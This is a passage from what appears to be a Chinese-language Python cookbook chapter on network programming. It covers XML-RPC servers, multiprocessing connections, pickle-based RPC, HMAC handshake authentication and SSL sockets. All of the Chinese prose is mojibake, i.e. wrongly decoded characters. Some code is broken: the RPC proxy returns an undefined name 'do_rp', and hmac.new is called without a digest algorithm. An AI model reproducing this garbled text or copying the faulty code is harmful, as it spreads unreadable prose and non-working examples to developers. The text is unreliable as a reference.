é¦–å…ˆå¾—æ˜¾å¼çš„ ä½¿ç”¨ str() è½¬æ¢å®ƒã€‚ åˆ›å»ºä¸€ä¸ªç®€å•çš„ REST æ¥å£ é—®é¢˜ ä½ æƒ³ä½¿ç”¨ä¸€ä¸ªç®€å•çš„ REST æ¥å£é€šè¿‡ç½‘ç»œè¿œç¨‹æ§åˆ¶æˆ–è®¿é—®ä½ çš„åº”ç”¨ç¨‹åºï¼Œä½†æ˜¯ä½  åˆä¸æƒ³è‡ªå·±å»å®‰è£…ä¸€ä¸ªå®Œæ•´çš„ web æ¡†æ¶ã€‚ è§£å†³æ–¹æ¡ˆ æ„å»ºä¸€ä¸ª REST é£æ ¼çš„æ¥å£æœ€ç®€å•çš„æ–¹æ³•æ˜¯åˆ›å»ºä¸€ä¸ªåŸºäº WSGI æ ‡å‡†ï¼ˆPEP 3333ï¼‰çš„å¾ˆå°çš„åº“. é€šè¿‡ XML-RPC å®ç°ç®€å•çš„è¿œç¨‹è°ƒç”¨ é—®é¢˜ ä½ æƒ³æ‰¾åˆ°ä¸€ä¸ªç®€å•çš„æ–¹å¼å»æ‰§è¡Œè¿è¡Œåœ¨è¿œç¨‹æœºå™¨ä¸Šé¢çš„ Python ç¨‹åºä¸­çš„å‡½æ•°æˆ–æ–¹ æ³• è§£å†³æ–¹æ¡ˆ å®ç°ä¸€ä¸ªè¿œç¨‹æ–¹æ³•è°ƒç”¨çš„æœ€ç®€å•æ–¹å¼æ˜¯ä½¿ç”¨ XML-RPCã€‚ä¸‹é¢æˆ‘ä»¬æ¼”ç¤ºä¸€ä¸‹ä¸€ä¸ª å®ç°äº†é”®-å€¼å­˜å‚¨åŠŸèƒ½çš„ç®€å•æœåŠ¡å™¨: from xmlrpc.server import SimpleXMLRPCServer class KeyValueServer: _rpc_methods_ = ['get', 'set', 'delete', 'exists', 'keys'] def __init__(self, address): self._data = {} self._serv = SimpleXMLRPCServer(address, allow_none=True) for name in self._rpc_methods_: self._serv.register_function(getattr(self, name)) def get(self, name): return self._data[name] def set(self, name, value): self._data[name] = value def delete(self, name): del self._data[name] def exists(self, name): return name in self._data def keys(self): return list(self._data) def serve_forever(self): self._serv.serve_forever() # Example if __name__ == '__main__': kvserv = KeyValueServer(('', 15000)) kvserv.serve_forever() ä»ä¸€ä¸ªå®¢æˆ·ç«¯æœºå™¨ä¸Šé¢æ¥è®¿é—®æœåŠ¡å™¨: >>> from xmlrpc.client import ServerProxy >>> s = ServerProxy('http://localhost:15000', allow_none=True) >>> s.set('foo', 'bar') >>> s.set('spam', [1, 2, 3]) >>> s.keys() ['spam', 'foo'] >>> s.get('foo') 'bar' >>> s.get('spam') [1, 2, 3] >>> s.delete('spam') >>> s.exists('spam') False >>> è®¨è®º XML-RPC å¯ä»¥è®©æˆ‘ä»¬å¾ˆå®¹æ˜“çš„æ„é€ ä¸€ä¸ªç®€å•çš„è¿œç¨‹è°ƒç”¨æœåŠ¡ã€‚ä½ æ‰€éœ€è¦åšçš„ä»… ä»…æ˜¯åˆ›å»ºä¸€ä¸ªæœåŠ¡å™¨å®ä¾‹ï¼Œé€šè¿‡å®ƒçš„æ–¹æ³• register_function() æ¥æ³¨å†Œå‡½æ•°ï¼Œç„¶åä½¿ ç”¨æ–¹æ³• serve_forever() å¯åŠ¨å®ƒã€‚åœ¨ä¸Šé¢æˆ‘ä»¬å°†è¿™äº›æ­¥éª¤æ”¾åœ¨ä¸€èµ·å†™åˆ°ä¸€ä¸ªç±»ä¸­ï¼Œä¸ å¤Ÿè¿™å¹¶ä¸æ˜¯å¿…é¡»çš„ã€‚æ¯”å¦‚ä½ è¿˜å¯ä»¥åƒä¸‹é¢è¿™æ ·åˆ›å»ºä¸€ä¸ªæœåŠ¡å™¨: from xmlrpc.server import SimpleXMLRPCServer def add(x,y): return x+y serv = SimpleXMLRPCServer(('', 15000)) serv.register_function(add) serv.serve_forever() XML-RPC æš´éœ²å‡ºæ¥çš„å‡½æ•°åªèƒ½é€‚ç”¨äºéƒ¨åˆ†æ•°æ®ç±»å‹ï¼Œæ¯”å¦‚å­—ç¬¦ä¸²ã€æ•´å½¢ã€åˆ—è¡¨å’Œ å­—å…¸ã€‚å¯¹äºå…¶ä»–ç±»å‹å°±å¾—éœ€è¦åšäº›é¢å¤–çš„åŠŸè¯¾äº†ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ æƒ³é€šè¿‡ XML-RPC ä¼  é€’ä¸€ä¸ªå¯¹è±¡å®ä¾‹ï¼Œå®é™…ä¸Šåªæœ‰ä»–çš„å®ä¾‹å­—å…¸è¢«å¤„ç†. ç±»ä¼¼çš„ï¼Œå¯¹äºäºŒè¿›åˆ¶æ•°æ®çš„å¤„ç†ä¹Ÿè·Ÿä½ æƒ³è±¡çš„ä¸å¤ªä¸€æ ·: >>> s.set('foo', b'Hello World') >>> s.get('foo') <xmlrpc.client.Binary object at 0x10131d410> >>> _.data b'Hello World' >>> ä¸€èˆ¬æ¥è®²ï¼Œä½ ä¸åº”è¯¥å°† XML-RPC æœåŠ¡ä»¥å…¬å…± API çš„æ–¹å¼æš´éœ²å‡ºæ¥ã€‚å¯¹äºè¿™ç§æƒ… å†µï¼Œé€šå¸¸åˆ†å¸ƒå¼åº”ç”¨ç¨‹åºä¼šæ˜¯ä¸€ä¸ªæ›´å¥½çš„é€‰æ‹©ã€‚ XML-RPC çš„ä¸€ä¸ªç¼ºç‚¹æ˜¯å®ƒçš„æ€§èƒ½ã€‚SimpleXMLRPCServer çš„å®ç°æ˜¯å•çº¿ç¨‹çš„ï¼Œæ‰€ ä»¥å®ƒä¸é€‚åˆäºå¤§å‹ç¨‹åº å¦å¤–ï¼Œç”±äº XML-RPC å°†æ‰€æœ‰æ•°æ®éƒ½åºåˆ—åŒ–ä¸º XML æ ¼å¼ï¼Œæ‰€ä»¥å®ƒä¼šæ¯”å…¶ä»–çš„æ–¹å¼è¿ è¡Œçš„æ…¢ä¸€äº›ã€‚ä½†æ˜¯å®ƒä¹Ÿæœ‰ä¼˜ç‚¹ï¼Œè¿™ç§æ–¹å¼çš„ç¼–ç å¯ä»¥è¢«ç»å¤§éƒ¨åˆ†å…¶ä»–ç¼–ç¨‹è¯­è¨€æ”¯æŒã€‚é€š è¿‡ä½¿ç”¨è¿™ç§æ–¹å¼ï¼Œå…¶ä»–è¯­è¨€çš„å®¢æˆ·ç«¯ç¨‹åºéƒ½èƒ½è®¿é—®ä½ çš„æœåŠ¡ã€‚ è™½ç„¶ XML-RPC æœ‰å¾ˆå¤šç¼ºç‚¹ï¼Œä½†æ˜¯å¦‚æœä½ éœ€è¦å¿«é€Ÿæ„å»ºä¸€ä¸ªç®€å•è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ç³» ç»Ÿçš„è¯ï¼Œå®ƒä»ç„¶å€¼å¾—å»å­¦ä¹ çš„ã€‚æœ‰æ—¶å€™ï¼Œç®€å•çš„æ–¹æ¡ˆå°±å·²ç»è¶³å¤Ÿäº†ã€‚ åœ¨ä¸åŒçš„ Python è§£é‡Šå™¨ä¹‹é—´äº¤äº’ é—®é¢˜ ä½ åœ¨ä¸åŒçš„æœºå™¨ä¸Šé¢è¿è¡Œç€å¤šä¸ª Python è§£é‡Šå™¨å®ä¾‹ï¼Œå¹¶å¸Œæœ›èƒ½å¤Ÿåœ¨è¿™äº›è§£é‡Šå™¨ä¹‹ é—´é€šè¿‡æ¶ˆæ¯æ¥äº¤æ¢æ•°æ®ã€‚ è§£å†³æ–¹æ¡ˆ é€šè¿‡ä½¿ç”¨ multiprocessing.connection æ¨¡å—å¯ä»¥å¾ˆå®¹æ˜“çš„å®ç°è§£é‡Šå™¨ä¹‹é—´çš„é€š ä¿¡ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„åº”ç­”æœåŠ¡å™¨ä¾‹å­: from multiprocessing.connection import Listener import traceback def echo_client(conn): try: while True: msg = conn.recv() conn.send(msg) except EOFError: print('Connection closed') def echo_server(address, authkey): serv = Listener(address, authkey=authkey) while True: try: client = serv.accept() echo_client(client) except Exception: traceback.print_exc() echo_server(('', 25000), authkey=b'peekaboo') ç„¶åå®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨å¹¶å‘é€æ¶ˆæ¯çš„ç®€å•ç¤ºä¾‹: >>> from multiprocessing.connection import Client >>> c = Client(('localhost', 25000), authkey=b'peekaboo') >>> c.send('hello') >>> c.recv() 'hello' >>> c.send([1, 2, 3, 4, 5]) >>> c.recv() [1, 2, 3, 4, 5] >>> è·Ÿåº•å±‚ socket ä¸åŒçš„æ˜¯ï¼Œæ¯ä¸ªæ¶ˆæ¯ä¼šå®Œæ•´ä¿å­˜ï¼ˆæ¯ä¸€ä¸ªé€šè¿‡ send() å‘é€çš„å¯¹è±¡èƒ½ é€šè¿‡ recv() æ¥å®Œæ•´æ¥å—ï¼‰ã€‚å¦å¤–ï¼Œæ‰€æœ‰å¯¹è±¡ä¼šé€šè¿‡ pickle åºåˆ—åŒ–ã€‚å› æ­¤ï¼Œä»»ä½•å…¼å®¹ pickle çš„å¯¹è±¡éƒ½èƒ½åœ¨æ­¤è¿æ¥ä¸Šé¢è¢«å‘é€å’Œæ¥å—ã€‚ è®¨è®º ç›®å‰æœ‰å¾ˆå¤šç”¨æ¥å®ç°å„ç§æ¶ˆæ¯ä¼ è¾“çš„åŒ…å’Œå‡½æ•°åº“ï¼Œæ¯”å¦‚ ZeroMQã€Celery ç­‰ã€‚ä½ è¿˜ æœ‰å¦å¤–ä¸€ç§é€‰æ‹©å°±æ˜¯è‡ªå·±åœ¨åº•å±‚ socket åŸºç¡€ä¹‹ä¸Šæ¥å®ç°ä¸€ä¸ªæ¶ˆæ¯ä¼ è¾“å±‚ã€‚ä½†æ˜¯ä½ æƒ³è¦ ç®€å•ä¸€ç‚¹çš„æ–¹æ¡ˆï¼Œé‚£ä¹ˆè¿™æ—¶å€™ multiprocessing.connection å°±æ´¾ä¸Šç”¨åœºäº†ã€‚ä»…ä»…ä½¿ç”¨ ä¸€äº›ç®€å•çš„è¯­å¥å³å¯å®ç°å¤šä¸ªè§£é‡Šå™¨ä¹‹é—´çš„æ¶ˆæ¯é€šä¿¡ã€‚ å¦‚æœä½ çš„è§£é‡Šå™¨è¿è¡Œåœ¨åŒä¸€å°æœºå™¨ä¸Šé¢ï¼Œé‚£ä¹ˆä½ å¯ä»¥ä½¿ç”¨å¦å¤–çš„é€šä¿¡æœºåˆ¶ï¼Œæ¯”å¦‚ Unix åŸŸå¥—æ¥å­—æˆ–è€…æ˜¯ Windows å‘½åç®¡é“ã€‚è¦æƒ³ä½¿ç”¨ UNIX åŸŸå¥—æ¥å­—æ¥åˆ›å»ºä¸€ä¸ªè¿æ¥ï¼Œ åªéœ€ç®€å•çš„å°†åœ°å€æ”¹å†™ä¸€ä¸ªæ–‡ä»¶åå³å¯: s = Listener('/tmp/myconn', authkey=b'peekaboo') è¦æƒ³ä½¿ç”¨ Windows å‘½åç®¡é“æ¥åˆ›å»ºè¿æ¥ï¼Œåªéœ€åƒä¸‹é¢è¿™æ ·ä½¿ç”¨ä¸€ä¸ªæ–‡ä»¶å: s = Listener(r'\\\\.\\pipe\\myconn', authkey=b'peekaboo') ä¸€ä¸ªé€šç”¨å‡†åˆ™æ˜¯ï¼Œä½ ä¸è¦ä½¿ç”¨ multiprocessing æ¥å®ç°ä¸€ä¸ªå¯¹å¤–çš„å…¬å…±æœåŠ¡ã€‚ Client() å’Œ Listener() ä¸­çš„ authkey å‚æ•°ç”¨æ¥è®¤è¯å‘èµ·è¿æ¥çš„ç»ˆç«¯ç”¨æˆ·ã€‚å¦‚æœå¯†é’¥ ä¸å¯¹ä¼šäº§ç”Ÿä¸€ä¸ªå¼‚å¸¸ã€‚æ­¤å¤–ï¼Œè¯¥æ¨¡å—æœ€é€‚åˆç”¨æ¥å»ºç«‹é•¿è¿æ¥ï¼ˆè€Œä¸æ˜¯å¤§é‡çš„çŸ­è¿æ¥ï¼‰ï¼Œ ä¾‹å¦‚ï¼Œä¸¤ä¸ªè§£é‡Šå™¨ä¹‹é—´å¯åŠ¨åå°±å¼€å§‹å»ºç«‹è¿æ¥å¹¶åœ¨å¤„ç†æŸä¸ªé—®é¢˜è¿‡ç¨‹ä¸­ä¼šä¸€ç›´ä¿æŒè¿ æ¥çŠ¶æ€ã€‚ å¦‚æœä½ éœ€è¦å¯¹åº•å±‚è¿æ¥åšæ›´å¤šçš„æ§åˆ¶ï¼Œæ¯”å¦‚éœ€è¦æ”¯æŒè¶…æ—¶ã€éé˜»å¡ I/O æˆ–å…¶ä»–ç±» ä¼¼çš„ç‰¹æ€§ï¼Œä½ æœ€å¥½ä½¿ç”¨å¦å¤–çš„åº“æˆ–è€…æ˜¯åœ¨é«˜å±‚ socket ä¸Šæ¥å®ç°è¿™äº›ç‰¹æ€§ã€‚ å®ç°è¿œç¨‹æ–¹æ³•è°ƒç”¨ é—®é¢˜ ä½ æƒ³åœ¨ä¸€ä¸ªæ¶ˆæ¯ä¼ è¾“å±‚å¦‚ sockets ã€multiprocessing connections æˆ– ZeroMQ çš„ åŸºç¡€ä¹‹ä¸Šå®ç°ä¸€ä¸ªç®€å•çš„è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼ˆRPCï¼‰ã€‚ è§£å†³æ–¹æ¡ˆ å°†å‡½æ•°è¯·æ±‚ã€å‚æ•°å’Œè¿”å›å€¼ä½¿ç”¨ pickle ç¼–ç åï¼Œåœ¨ä¸åŒçš„è§£é‡Šå™¨ç›´æ¥ä¼ é€ pickle å­— èŠ‚å­—ç¬¦ä¸²ï¼Œå¯ä»¥å¾ˆå®¹æ˜“çš„å®ç° RPCã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ PRC å¤„ç†å™¨ï¼Œå¯ä»¥è¢«æ•´åˆåˆ°ä¸€ ä¸ªæœåŠ¡å™¨ä¸­å»: # rpcserver.py import pickle class RPCHandler: def __init__(self): self._functions = { } def register_function(self, func): self._functions[func.__name__] = func def handle_connection(self, connection): try: while True: # Receive a message func_name, args, kwargs = pickle.loads(connection.recv()) # Run the RPC and send a response try: r = self._functions[func_name](*args,**kwargs) connection.send(pickle.dumps(r)) except Exception as e: connection.send(pickle.dumps(e)) except EOFError: pass è¦ä½¿ç”¨è¿™ä¸ªå¤„ç†å™¨ï¼Œä½ éœ€è¦å°†å®ƒåŠ å…¥åˆ°ä¸€ä¸ªæ¶ˆæ¯æœåŠ¡å™¨ä¸­ã€‚ä½ æœ‰å¾ˆå¤šç§é€‰æ‹©ï¼Œä½†æ˜¯ ä½¿ç”¨ multiprocessing åº“æ˜¯æœ€ç®€å•çš„ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ª RPC æœåŠ¡å™¨ä¾‹å­: from multiprocessing.connection import Listener from threading import Thread def rpc_server(handler, address, authkey): sock = Listener(address, authkey=authkey) while True: client = sock.accept() t = Thread(target=handler.handle_connection, args=(client,)) t.daemon = True t.start() # Some remote functions def add(x, y): return x + y def sub(x, y): return x - y # Register with a handler handler = RPCHandler() handler.register_function(add) handler.register_function(sub) # Run the server rpc_server(handler, ('localhost', 17000), authkey=b'peekaboo') ä¸ºäº†ä»ä¸€ä¸ªè¿œç¨‹å®¢æˆ·ç«¯è®¿é—®æœåŠ¡å™¨ï¼Œä½ éœ€è¦åˆ›å»ºä¸€ä¸ªå¯¹åº”çš„ç”¨æ¥ä¼ é€è¯·æ±‚çš„ RPC ä»£ç†ç±»ã€‚ä¾‹å¦‚: import pickle class RPCProxy: def __init__(self, connection): self._connection = connection def __getattr__(self, name): def do_rpc(*args, **kwargs): self._connection.send(pickle.dumps((name, args, kwargs))) result = pickle.loads(self._connection.recv()) if isinstance(result, Exception): raise result return result return do_rp è¦ä½¿ç”¨è¿™ä¸ªä»£ç†ç±»ï¼Œä½ éœ€è¦å°†å…¶åŒ…è£…åˆ°ä¸€ä¸ªæœåŠ¡å™¨çš„è¿æ¥ä¸Šé¢ï¼Œä¾‹å¦‚: >>> from multiprocessing.connection import Client >>> c = Client(('localhost', 17000), authkey=b'peekaboo') >>> proxy = RPCProxy(c) >>> proxy.add(2, 3) 5 >>> proxy.sub(2, 3) -1 >>> proxy.sub([1, 2], 4) Traceback (most recent call last): File \"<stdin>\", line 1, in <module> File \"rpcserver.py\", line 37, in do_rpc raise result TypeError: unsupported operand type(s) for -: 'list' and 'int' >>> è¦æ³¨æ„çš„æ˜¯å¾ˆå¤šæ¶ˆæ¯å±‚ï¼ˆæ¯”å¦‚ multiprocessing ï¼‰å·²ç»ä½¿ç”¨ pickle åºåˆ—åŒ–äº†æ•°æ®ã€‚ å¦‚æœæ˜¯è¿™æ ·çš„è¯ï¼Œå¯¹ pickle.dumps() å’Œ pickle.loads() çš„è°ƒç”¨è¦å»æ‰ã€‚ è®¨è®º ç”±äºåº•å±‚éœ€è¦ä¾èµ– pickleï¼Œé‚£ä¹ˆå®‰å…¨é—®é¢˜å°±éœ€è¦è€ƒè™‘äº†ï¼ˆå› ä¸ºä¸€ä¸ªèªæ˜çš„é»‘å®¢å¯ä»¥ åˆ›å»ºç‰¹å®šçš„æ¶ˆæ¯ï¼Œèƒ½å¤Ÿè®©ä»»æ„å‡½æ•°é€šè¿‡ pickle ååºåˆ—åŒ–åè¢«æ‰§è¡Œï¼‰ã€‚å› æ­¤ä½ æ°¸è¿œä¸è¦å… è®¸æ¥è‡ªä¸ä¿¡ä»»æˆ–æœªè®¤è¯çš„å®¢æˆ·ç«¯çš„ RPCã€‚ç‰¹åˆ«æ˜¯ä½ ç»å¯¹ä¸è¦å…è®¸æ¥è‡ª Internet çš„ä»»æ„ æœºå™¨çš„è®¿é—®ï¼Œè¿™ç§åªèƒ½åœ¨å†…éƒ¨è¢«ä½¿ç”¨ï¼Œä½äºé˜²ç«å¢™åé¢å¹¶ä¸”ä¸è¦å¯¹å¤–æš´éœ²ã€‚ å®ç° RPC çš„ä¸€ä¸ªæ¯”è¾ƒå¤æ‚çš„é—®é¢˜æ˜¯å¦‚ä½•å»å¤„ç†å¼‚å¸¸ã€‚è‡³å°‘ï¼Œå½“æ–¹æ³•äº§ç”Ÿå¼‚å¸¸æ—¶æœ åŠ¡å™¨ä¸åº”è¯¥å¥”æºƒã€‚å› æ­¤ï¼Œè¿”å›ç»™å®¢æˆ·ç«¯çš„å¼‚å¸¸æ‰€ä»£è¡¨çš„å«ä¹‰å°±è¦å¥½å¥½è®¾è®¡äº†ã€‚å¦‚æœä½ ä½¿ ç”¨ pickleï¼Œå¼‚å¸¸å¯¹è±¡å®ä¾‹åœ¨å®¢æˆ·ç«¯èƒ½è¢«ååºåˆ—åŒ–å¹¶æŠ›å‡ºã€‚å¦‚æœä½ ä½¿ç”¨å…¶ä»–çš„åè®®ï¼Œé‚£å¾— æƒ³æƒ³å¦å¤–çš„æ–¹æ³•äº†ã€‚ä¸è¿‡è‡³å°‘ï¼Œä½ åº”è¯¥åœ¨å“åº”ä¸­è¿”å›å¼‚å¸¸å­—ç¬¦ä¸²ã€‚ ç®€å•çš„å®¢æˆ·ç«¯è®¤è¯ é—®é¢˜ ä½ æƒ³åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­å®ç°ä¸€ä¸ªç®€å•çš„å®¢æˆ·ç«¯è¿æ¥è®¤è¯åŠŸèƒ½ï¼Œåˆä¸æƒ³åƒ SSL é‚£æ ·çš„ å¤æ‚ã€‚ è§£å†³æ–¹æ¡ˆ å¯ä»¥åˆ©ç”¨ hmac æ¨¡å—å®ç°ä¸€ä¸ªè¿æ¥æ¡æ‰‹ï¼Œä»è€Œå®ç°ä¸€ä¸ªç®€å•è€Œé«˜æ•ˆçš„è®¤è¯è¿‡ç¨‹ã€‚ä¸‹ é¢æ˜¯ä»£ç ç¤ºä¾‹: import hmac import os def client_authenticate(connection, secret_key): ''' Authenticate client to a remote service. connection represents a network connection. secret_key is a key known only to both client/server. ''' message = connection.recv(32) hash = hmac.new(secret_key, message) digest = hash.digest() connection.send(digest) def server_authenticate(connection, secret_key): ''' Request client authentication. ''' message = os.urandom(32) connection.send(message) hash = hmac.new(secret_key, message) digest = hash.digest() response = connection.recv(len(digest)) return hmac.compare_digest(digest,response) åŸºæœ¬åŸç†æ˜¯å½“è¿æ¥å»ºç«‹åï¼ŒæœåŠ¡å™¨ç»™å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªéšæœºçš„å­—èŠ‚æ¶ˆæ¯ï¼ˆè¿™é‡Œä¾‹å­ ä¸­ä½¿ç”¨äº† os.urandom() è¿”å›å€¼ï¼‰ã€‚å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åŒæ—¶åˆ©ç”¨ hmac å’Œä¸€ä¸ªåªæœ‰åŒæ–¹çŸ¥ é“çš„å¯†é’¥æ¥è®¡ç®—å‡ºä¸€ä¸ªåŠ å¯†å“ˆå¸Œå€¼ã€‚ç„¶åå®¢æˆ·ç«¯å°†å®ƒè®¡ç®—å‡ºçš„æ‘˜è¦å‘é€ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡ å™¨é€šè¿‡æ¯”è¾ƒè¿™ä¸ªå€¼å’Œè‡ªå·±è®¡ç®—çš„æ˜¯å¦ä¸€è‡´æ¥å†³å®šæ¥å—æˆ–æ‹’ç»è¿æ¥ã€‚æ‘˜è¦çš„æ¯”è¾ƒéœ€è¦ä½¿ ç”¨ hmac.compare_digest() å‡½æ•°ã€‚ä½¿ç”¨è¿™ä¸ªå‡½æ•°å¯ä»¥é¿å…é­åˆ°æ—¶é—´åˆ†ææ”»å‡»ï¼Œä¸è¦ç”¨ ç®€å•çš„æ¯”è¾ƒæ“ä½œç¬¦ï¼ˆ==ï¼‰ã€‚ä¸ºäº†ä½¿ç”¨è¿™äº›å‡½æ•°ï¼Œä½ éœ€è¦å°†å®ƒé›†æˆåˆ°å·²æœ‰çš„ç½‘ç»œæˆ–æ¶ˆæ¯ ä»£ç ä¸­ã€‚ è®¨è®º hmac è®¤è¯çš„ä¸€ä¸ªå¸¸è§ä½¿ç”¨åœºæ™¯æ˜¯å†…éƒ¨æ¶ˆæ¯é€šä¿¡ç³»ç»Ÿå’Œè¿›ç¨‹é—´é€šä¿¡ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½  ç¼–å†™çš„ç³»ç»Ÿæ¶‰åŠåˆ°ä¸€ä¸ªé›†ç¾¤ä¸­å¤šä¸ªå¤„ç†å™¨ä¹‹é—´çš„é€šä¿¡ï¼Œä½ å¯ä»¥ä½¿ç”¨æœ¬èŠ‚æ–¹æ¡ˆæ¥ç¡®ä¿åª æœ‰è¢«å…è®¸çš„è¿›ç¨‹ä¹‹é—´æ‰èƒ½å½¼æ­¤é€šä¿¡ã€‚äº‹å®ä¸Šï¼ŒåŸºäº hmac çš„è®¤è¯è¢« multiprocessing æ¨¡ å—ä½¿ç”¨æ¥å®ç°å­è¿›ç¨‹ç›´æ¥çš„é€šä¿¡ã€‚ è¿˜æœ‰ä¸€ç‚¹éœ€è¦å¼ºè°ƒçš„æ˜¯è¿æ¥è®¤è¯å’ŒåŠ å¯†æ˜¯ä¸¤ç äº‹ã€‚è®¤è¯æˆåŠŸä¹‹åçš„é€šä¿¡æ¶ˆæ¯æ˜¯ä»¥ æ˜æ–‡å½¢å¼å‘é€çš„ï¼Œä»»ä½•äººåªè¦æƒ³ç›‘å¬è¿™ä¸ªè¿æ¥çº¿è·¯éƒ½èƒ½çœ‹åˆ°æ¶ˆæ¯ï¼ˆå°½ç®¡åŒæ–¹çš„å¯†é’¥ä¸ ä¼šè¢«ä¼ è¾“ï¼‰ hmac è®¤è¯ç®—æ³•åŸºäºå“ˆå¸Œå‡½æ•°å¦‚ MD5 å’Œ SHA-1ï¼Œ åœ¨ç½‘ç»œæœåŠ¡ä¸­åŠ å…¥ SSL é—®é¢˜ ä½ æƒ³å®ç°ä¸€ä¸ªåŸºäº sockets çš„ç½‘ç»œæœåŠ¡ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨é€šè¿‡ SSL åè®®è®¤è¯å¹¶åŠ  å¯†ä¼ è¾“çš„æ•°æ®ã€‚ è§£å†³æ–¹æ¡ˆ ssl æ¨¡å—èƒ½ä¸ºåº•å±‚ socket è¿æ¥æ·»åŠ  SSL çš„æ”¯æŒã€‚ssl.wrap_socket() å‡½æ•°æ¥å—ä¸€ ä¸ªå·²å­˜åœ¨çš„ socket ä½œä¸ºå‚æ•°å¹¶ä½¿ç”¨ SSL å±‚æ¥åŒ…è£…å®ƒã€‚ä¾‹å¦‚ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„åº”ç­”æœ åŠ¡å™¨ï¼Œèƒ½åœ¨æœåŠ¡å™¨ç«¯ä¸ºæ‰€æœ‰å®¢æˆ·ç«¯è¿æ¥åšè®¤è¯ã€‚ ä¾‹å­: from socket import socket, AF_INET, SOCK_STREAM import ssl KEYFILE = 'server_key.pem' # Private key of the server CERTFILE = 'server_cert.pem' # Server certificate (given to client) def echo_client(s): while True: data = s.recv(8192) if data == b'': break s.send(data) s.close() print('Connection closed') def echo_server(address): s = socket(AF_INET, SOCK_STREAM) s.bind(address) s.listen(1) # Wrap with an SSL layer requiring client certs s_ssl = ssl.wrap_socket(s, keyfile=KEYFILE, certfile=CERTFILE, server_side=True ) # Wait for connections while True: try: c,a = s_ssl.accept() print('Got connection', c, a) echo_client(c) except Exception as e: print('{}: {}'.format(e.__class__.__name__, e)) echo_server(('', 20000)) å®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨: >>> from socket import socket, AF_INET, SOCK_STREAM >>> import ssl >>> s = socket(AF_INET, SOCK_STREAM) >>> s_ssl = ssl.wrap_socket(s, cert_reqs=ssl.CERT_REQUIRED, ca_certs = 'server_cert.pem') >>> s_ssl.connect(('localhost', 20000)) >>> s_ssl.send(b'Hello World?') 12 >>> s_ssl.recv(8192) b'Hello World?' >>> è¿™ç§ç›´æ¥å¤„ç†åº•å±‚ socket æ–¹å¼æœ‰ä¸ªé—®é¢˜å°±æ˜¯å®ƒä¸èƒ½å¾ˆå¥½çš„è·Ÿæ ‡å‡†åº“ä¸­å·²å­˜åœ¨çš„ ç½‘ç»œæœåŠ¡å…¼å®¹ã€‚ä¾‹å¦‚ï¼Œç»å¤§éƒ¨åˆ†æœåŠ¡å™¨ä»£ç ï¼ˆHTTPã€XML-RPC ç­‰ï¼‰å®é™…ä¸Šæ˜¯åŸºäº socketserver åº“çš„ã€‚å®¢æˆ·ç«¯ä»£ç åœ¨ä¸€ä¸ªè¾ƒé«˜å±‚ä¸Šå®ç°ã€‚æˆ‘ä»¬éœ€è¦å¦å¤–ä¸€ç§ç¨å¾®ä¸åŒçš„ æ–¹å¼æ¥å°† SSL æ·»åŠ åˆ°å·²å­˜åœ¨çš„æœåŠ¡ä¸­ åˆ›å»ºè‡ªç­¾åè¯ä¹¦: openssl req -new -x509 -days 365 -nodes -out server_cert.pem -keyout server_key.pem åœ¨åˆ›å»ºè¯ä¹¦çš„æ—¶å€™ï¼Œå„ä¸ªå€¼çš„è®¾å®šå¯ä»¥æ˜¯ä»»æ„çš„ï¼Œä½†æ˜¯\"Common Name\"çš„å€¼é€š å¸¸è¦åŒ…å«æœåŠ¡å™¨çš„ DNS ä¸»æœºåã€‚å¦‚æœä½ åªæ˜¯åœ¨æœ¬æœºæµ‹è¯•ï¼Œé‚£ä¹ˆå°±ä½¿ç”¨\"localhost\"ï¼Œå¦ åˆ™ä½¿ç”¨æœåŠ¡å™¨çš„åŸŸåã€‚ è¿›ç¨‹é—´ä¼ é€’ Socket æ–‡ä»¶æè¿°ç¬¦ é—®é¢˜ ä½ æœ‰å¤šä¸ª Python è§£é‡Šå™¨è¿›ç¨‹åœ¨åŒæ—¶è¿è¡Œï¼Œä½ æƒ³å°†æŸä¸ªæ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ä»ä¸€ä¸ªè§£ é‡Šå™¨ä¼ é€’ç»™å¦å¤–ä¸€ä¸ªã€‚æ¯”å¦‚ï¼Œå‡è®¾æœ‰ä¸ªæœåŠ¡å™¨è¿›ç¨‹ç›¸åº”è¿æ¥è¯·æ±‚ï¼Œä½†æ˜¯å®é™…çš„ç›¸åº”é€»è¾‘ æ˜¯åœ¨å¦ä¸€ä¸ªè§£é‡Šå™¨ä¸­æ‰§è¡Œçš„ã€‚ è§£å†³æ–¹æ¡ˆ ä¸ºäº†åœ¨å¤šä¸ªè¿›ç¨‹ä¸­ä¼ é€’æ–‡ä»¶æè¿°ç¬¦ï¼Œä½ é¦–å…ˆéœ€è¦å°†å®ƒä»¬è¿æ¥åˆ°ä¸€èµ·ã€‚åœ¨ Unix æœºå™¨ ä¸Šï¼Œä½ å¯èƒ½éœ€è¦ä½¿ç”¨ Unix åŸŸå¥—æ¥å­—ï¼Œè€Œåœ¨ windows ä¸Šé¢ä½ éœ€è¦ä½¿ç”¨å‘½åç®¡é“ã€‚ä¸è¿‡ä½  æ— éœ€çœŸçš„éœ€è¦å»æ“ä½œè¿™äº›åº•å±‚ï¼Œé€šå¸¸ä½¿ç”¨ multiprocessing æ¨¡å—æ¥åˆ›å»ºè¿™æ ·çš„è¿æ¥ä¼š æ›´å®¹æ˜“ä¸€äº›ã€‚ ä¸€ æ—¦ ä¸€ ä¸ª è¿ æ¥ è¢« åˆ› å»ºï¼Œ ä½  å¯ ä»¥ ä½¿ ç”¨ multiprocessing.reduction ä¸­ çš„ send_handle() å’Œ recv_handle() å‡½æ•°åœ¨ä¸åŒçš„å¤„ç†å™¨ç›´æ¥ä¼ é€’æ–‡ä»¶æè¿°ç¬¦ã€‚ä¸‹é¢ 